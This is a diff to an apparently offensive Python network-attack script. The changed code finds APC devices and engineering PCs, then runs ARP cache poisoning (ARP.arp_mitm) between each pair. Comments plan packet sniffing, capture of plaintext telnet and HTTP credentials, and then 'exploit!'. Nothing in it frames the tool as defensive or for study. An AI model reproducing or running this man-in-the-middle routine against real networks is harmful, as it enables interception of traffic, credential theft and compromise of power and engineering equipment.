@@ -2,8 +2,9 @@
 #Written by Christopher Di-Nozzi
 
 #TODO
-#Finish implementing spinners.
+#Finish implementing spinners in http.
 #Automate MITM functionality????
+#add packet sniffing component
 
 import requests #for sending HTTP requests
 from pyfiglet import Figlet #pretty banners
@@ -219,7 +220,7 @@ def automagic():
         prGreen("[+] Obtained the following potential engineering PCs:")
         for t in eng_pcs:
             prGreen("[+] "+t)
-        #if found, posison all ARP cahces for any traffic going it, then monitor for plain text credentials (telnet or http)
+        #if found, posison all ARP cahces for any traffic going it
         for apc in apc_devices:
             for pc in eng_pcs:
                 ARP.arp_mitm(pc,apc)
@@ -227,11 +228,8 @@ def automagic():
         prRed('[-] No devices found, self destructing.')
         return
 
+    #then monitor for plain text credentials (telnet or http)
 
-
-    apc_switch_ip=""
-    victim_ip=""
-    #ARP.arp_mitm(victim_ip,apc_switch_ip)
    #if creds found, exploit!
     
 
